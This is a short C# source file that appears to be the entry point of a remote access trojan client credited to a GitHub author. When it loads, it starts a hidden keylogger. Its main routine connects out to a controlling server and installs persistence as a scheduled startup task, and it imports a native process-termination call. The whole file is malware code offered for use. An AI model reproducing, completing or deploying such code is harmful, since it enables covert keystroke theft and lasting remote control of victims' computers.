using System;
using System.Runtime.InteropServices;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    public class EntryClass
    {
        internal static bool KeylogOn;
        static EntryClass()
        {
            KeylogOn = false;
            clientHandler = new ClientHandler();
            StartOfflineKeylogger();
        }

        internal static void StartOfflineKeylogger()
        {
            if (!KeylogOn && Config.offKeylog != "False")
            {
                Plugin.Launch.Start();
                KeylogOn = true;
            }
        }

        [DllImport("ntdll.dll")]
        internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

        internal static ClientHandler clientHandler;

        public static void Main()
        {
            clientHandler.ConnectStart();
            MakeInstall();
            new Thread(new ThreadStart(() => {
                while (true)
                {
                    Thread.Sleep(-1);
                }
            })).Start();
        }

        public static void MakeInstall()
        {
            Persistence.Launch.StartUpTaskScheduler(Config.time, Config.taskName);
        }
    }
}
